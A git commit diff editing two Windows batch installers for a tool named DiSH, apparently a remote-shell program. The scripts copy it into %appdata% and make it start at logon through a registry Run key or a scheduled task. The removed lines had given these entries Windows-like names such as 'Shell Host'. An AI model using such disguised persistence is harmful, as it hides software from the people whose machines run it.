3bb3504acf90aeb931e4377e1079b4cc7338ba63
StarNumber <64470722+StarNumber12046@users.noreply.github.com>
2022-09-20 16:58:22 +0200

    fix(installer): fixed installer

--- setup-registry.bat
+++ setup-registry.bat
@@ -1,8 +1,6 @@
-pip install -r requirements.txt
 mkdir %appdata%\DiSH
 copy DiSH.exe %appdata%\DiSH
-copy main.py %appdata%\DiSH
 copy .env %appdata%\DiSH
-reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ /V "Shell Host" /t REG_SZ /F /D "%appdata%\DiSH\DiSH.exe"
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ /V "DiSH" /t REG_SZ /F /D "%appdata%\DiSH\DiSH.exe"
 echo starting...
-start %appdata%\DiSH\executor.exe
+start %appdata%\DiSH\DiSH.exe
--- setup-task-scheduler.bat
+++ setup-task-scheduler.bat
@@ -1,10 +1,9 @@
 @echo off
-pip install -r requirements.txt
 mkdir %appdata%\DiSH
 copy executor.exe %appdata%\DiSH
 copy .env %appdata%\DiSH
 copy main.py %appdata%\DiSH
-schtasks /create /sc onlogon /tn "Windows DiSH host" /tr "%appdata%\DiSH\DiSH.exe" /f
+schtasks /create /sc onlogon /tn "Windows DiSH " /tr "%appdata%\DiSH\DiSH.exe" /f
 echo starting...
 start %appdata%\DiSH\executor.exe
 pause > nul
